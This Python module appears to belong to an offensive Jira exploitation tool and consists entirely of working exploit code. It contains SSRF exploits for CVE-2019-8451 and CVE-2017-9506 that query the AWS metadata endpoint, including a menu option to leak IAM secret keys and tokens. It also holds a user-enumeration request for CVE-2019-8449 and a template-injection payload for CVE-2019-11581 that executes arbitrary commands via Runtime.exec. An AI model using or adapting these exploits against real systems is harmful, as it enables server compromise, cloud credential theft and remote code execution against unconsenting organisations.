#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from .recon import request, uparse, isaws
import requests, os, sys
from bs4 import BeautifulSoup

if any(x in sys.platform.lower() for x in ['linux', 'linux2', 'win32']): # hotfix/issue#5
    os.system('color')
  # Group of Different functions for different styles
    class style():
        BLACK = lambda x: '\033[30m' + str(x)
        RED = lambda x: '\033[31m' + str(x)
        GREEN = lambda x: '\033[32m' + str(x)
        YELLOW = lambda x: '\033[33m' + str(x)
        BLUE = lambda x: '\033[34m' + str(x)
        MAGENTA = lambda x: '\033[35m' + str(x)
        CYAN = lambda x: '\033[36m' + str(x)
        WHITE = lambda x: '\033[37m' + str(x)
        UNDERLINE = lambda x: '\033[4m' + str(x)
        RESET = lambda x: '\033[0m' + str(x)
else:
    class style():
        BLACK = ""
        RED = ""
        GREEN = ""
        YELLOW = ""
        BLUE = ""
        MAGENTA = ""
        CYAN = ""
        WHITE = ""
        UNDERLINE = ""
        RESET = ""


AWS_INSTANCE = "http://169.254.169.254/latest"
AWS_METADATA = "http://169.254.169.254/latest/meta-data/"
AWS_IAM_DATA = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
AWS_IAM_CRED = "http://169.254.169.254/latest/meta-data/iam/security-credentials/%s" #<rolename>

# CVE-2019-8451
def cve2019_8451(target, ssrf='https://google.com'):
	print(style.YELLOW("[*] Launching CVE-2019-8451 Exploit ...") + style.RESET(''))
	target = uparse(target)
	# http://host:port/plugins/servlet/gadgets/makeRequest?url=http://{}:{}@{}'.format(host, port, target)
	payload = target + "/plugins/servlet/gadgets/makeRequest?url=" + target + '@' + ssrf
	res, response = request(payload)

	if '"rc":200' in response and res.status_code == 200 and 'set-cookie' in response:
		print(style.GREEN("[+] Target found vulnerable to CVE-2019-8451") + style.RESET(''))
		print(style.YELLOW("[*] Detecting target's hosting service ...") + style.RESET(''))
		if isaws(target):
			print(style.GREEN("[+] Target is hosted on Amazon AWS") + style.RESET(''))
			print(style.YELLOW("[*] Testing AWS SSRF payloads ...") + style.RESET(''))
			payload = target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + AWS_INSTANCE
			res, response = request(payload)
			if res.status_code == 200:
				print(style.GREEN("[+] SUCCESS!") + style.RESET(''))
				print(style.GREEN('\t\t\t' + response.replace('\n', '\n\t\t\t')) + style.RESET(''))
				print(style.YELLOW("[*] Select Payload:\n1. Show AWS Metadata\n2. Access to the AWS Instance\n3. Leak Secret Access Keys and Tokens\n4. Custom SSRF Payload") + style.RESET(''))
				try:
					ex = input("=> ")
					if ex == "1":
						res, response = request(target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + AWS_METADATA)
						print(style.GREEN('\t\t\t' + response.replace('\n', '\n\t\t\t')) + style.RESET(''))
						print("="*50, "END", "="*50)
					elif ex == "2":
						res, response = request(target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + AWS_IAM_DATA)
						print(style.GREEN('\t\t\t' + response.replace('\n', '\n\t\t\t')) + style.RESET(''))
						print("="*50, "END", "="*50)
					elif ex == "3":
						res, response = request(target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + AWS_IAM_CRED % input("Enter the User Role Name to Leak Access/Token Keys: "))
						print(style.GREEN('\t\t\t' + response.replace('\n', '\n\t\t\t')) + style.RESET(''))
						print("="*50, "END", "="*50)
					elif ex == "4":
						print(style.YELLOW("[*] Enter Custom SSRF Payload ...") + style.RESET(''))
						customSSRF = input(style.GREEN("=> ") + style.RESET('')).strip()
						res, response = request(target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + customSSRF)
						print(style.GREEN(response) + style.RESET(''))
						print("="*50, "END", "="*50)
					else:
						print(style.RED("[-] Invalid Selection.") + style.RESET(''))
				except KeyboardInterrupt:
					print(style.RED('Interrupted.') + style.RESET(''))
					sys.exit(0) # http://tldp.org/LDP/abs/html/exitcodes.html#EXITCODESREF
			else:
				print(style.RED("[-] AWS Instance payload failed ...") + style.RESET(''))
		else:
			print(style.RED("[-] Target is not hosted on AWS ...") + style.RESET(''))
	elif res.status_code != 200:
		print(style.GREEN("[-] Something went wrong! (STATUS {})").format(style.UNDERLINE(res.status_code) + style.RESET('')) + style.RESET(''))
		if res.status_code == 302:
			print(style.GREEN("[-] HTTP request got redirected. Set this instead: {}").format(style.UNDERLINE(res.headers['Location']) + style.RESET('')) + style.RESET(''))
	else:
		print(style.RED("[-] Target doesn't seems to be vulnerable. [CVE-2019-8451]") + style.RESET(''))

# CVE-2017-9506
def cve2017_9506(target):
	print(style.YELLOW("[*] Launching CVE-2017-9506 Exploit ...") + style.RESET(''))
	target = uparse(target)
	test_ssrf_url = "https://www.google.com"
	payload = target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + test_ssrf_url
	res, response = request(payload)

	if res.status_code == 200 and 'googlelogo' in response:
		print(style.GREEN("[+] Target found vulnerable to CVE-2017-9506") + style.RESET(''))
		print(style.GREEN("[+] X-AUSERNAME: {}").format(style.UNDERLINE(res.headers.get('X-AUSERNAME')) + style.RESET('')) + style.RESET(''))
		print(style.YELLOW("[*] Detecting target's hosting service ...") + style.RESET(''))
		if isaws(target.split('://')[1]): # dirty but works reliably
			print(style.GREEN("[+] Target is hosted on Amazon AWS") + style.RESET(''))
			print(style.YELLOW("[*] Testing AWS SSRF payloads ...") + style.RESET(''))
			payload = target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + AWS_INSTANCE
			res, response = request(payload)
			if res.status_code == 200:
				print(style.GREEN("[+] SUCCESS!") + style.RESET(''))
				print(style.GREEN('\t\t\t' + response.replace('\n', '\n\t\t\t')) + style.RESET(''))
				print(style.YELLOW("[*] Select Payload:\n1. Show AWS Metadata\n2. Access to the AWS Instance\n3. Leak Secret Access Keys and Tokens\n4. Custom SSRF Payload") + style.RESET(''))
				try:
					ex = input(style.GREEN("=> ") + style.RESET(''))
					if ex == "1":
						res, response = request(target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + AWS_METADATA)
						print(style.GREEN('\t\t\t' + response.replace('\n', '\n\t\t\t')) + style.RESET(''))
						print("="*50, "END", "="*50)
					elif ex == "2":
						res, response = request(target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + AWS_IAM_DATA)
						print(style.GREEN('\t\t\t' + response.replace('\n', '\n\t\t\t')) + style.RESET(''))
						print("="*50, "END", "="*50)
					elif ex == "3":
						res, response = request(target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + AWS_IAM_CRED % input("Enter the User Role Name to Leak Access/Token Keys: "))
						print(style.GREEN('\t\t\t' + response.replace('\n', '\n\t\t\t')) + style.RESET(''))
						print("="*50, "END", "="*50)
					elif ex == "4":
						print(style.YELLOW("[*] Enter Custom SSRF Payload ...") + style.RESET(''))
						customSSRF = input(style.GREEN("=> ") + style.RESET('')).strip()
						res, response = request(target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + customSSRF)
						print(style.GREEN(response) + style.RESET(''))
						print("="*50, "END", "="*50)
					else:
						print(style.RED("[-] Invalid Selection.") + style.RESET(''))
				except KeyboardInterrupt:
					print(style.RED('Interrupted.') + style.RESET(''))
					quit()
			else:
				print(style.RED("[-] AWS Instance payload failed ...") + style.RESET(''))
		else:
			print(style.RED("[-] Target is not hosted on AWS ...") + style.RESET(''))
	else:
		print(style.RED("[-] Target doesn't seems to be vulnerable. [CVE-2017-9506]") + style.RESET(''))

# CVE-2019-8449
def cve2019_8449(target):
	print(style.YELLOW("[*] Launching CVE-2019-8449 Exploit ...") + style.RESET(''))
	target = uparse(target)
	dom = target + "/rest/api/latest/groupuserpicker"
	try:
		query = input(style.YELLOW("[>] Enter search query: [required] (e.g. admin) => ") + style.RESET(''))
		maxResults = input(style.YELLOW("\n[>] Enter the number of maximum results to fetch: (50) => ") + style.RESET(''))
		fieldId = input(style.YELLOW("\n[>] Enter the fieldId to fetch: => ") + style.RESET(''))
		projectId = input(style.YELLOW("\n[>] Enter the projectId to fetch: => ") + style.RESET(''))
		issueTypeId = input(style.YELLOW("\n[>] Enter the issueTypeId to fetch: => ") + style.RESET(''))
	except KeyboardInterrupt:
		print(style.RED('Interrupted.') + style.RESET(''))
		quit()
	payload = {
		'query': query, 
		'maxResults': maxResults, 
		'showAvatar': 'true', 
		'fieldId': fieldId, 
		'projectId': projectId, 
		'issueTypeId': issueTypeId, 
		'avatarSize': 'xsmall', 
		'caseInsensitive': 'false', 
		'excludeConnectAddons': 'false'
	}

	try:
		r = requests.get(dom, params=payload)
		response = r.json()
	except:
		print(style.RED("[-] Target doesn't seems to be vulnerable. [CVE-2019-8449]") + style.RESET(''))
		quit()
	print(style.GREEN("[+] SUCCESS: {}".format(style.MAGENTA(response)) + style.RESET('')) + style.RESET(''))

# CVE-2019-11581
def cve2019_11581(target, command='calc'): # default windows payload
	print(style.YELLOW("[*] Launching CVE-2019-11581 Exploit ...") + style.RESET(''))
	UA = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
	headers = {'UserAgent':UA}
	proxyDict = { 
			"http"  : "http://127.0.0.1:8080", 
			"https" : "https://127.0.0.1:8080"
	}
	target = uparse(target)
	target = target + '/secure/ContactAdministrators!default.jspa'
	sess = requests.Session()
	r = sess.get(target)
	soup = BeautifulSoup(r.content, 'lxml')
	check = soup.findAll("div",{"class":"aui-message aui-message-warning warningd"})
	if check:
		print(style.RED("[-] Target doesn't seems to be vulnerable. [CVE-2019-11581]") + style.RESET(''))
		quit()
	else:
		data = soup.findAll(attrs={"name" : "atl_token"})
		if not data:
			print(style.RED("[-] Couldn't find the CSRF Token. Quitting. [CVE-2019-11581]") + style.RESET(''))
			quit()
		token = data[0]['value']
		print("[+] Found JIRA CSRF Token:", token)
		target= target.replace('!default.jspa','.jspa')
		# body of post request => (),'subject':"",'details':",'atl_token': value,'Send':'Send'}
		payload = "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('%s').waitFor()" % command
		params = (('from','JIRA@JIRA.com'),('subject',payload),('details',payload),('atl_token',token),('Send','Send'))
		final = sess.post(target, headers=headers, data=params, verify=False)
		print("[+] SUCCESS:", final, sep="\n")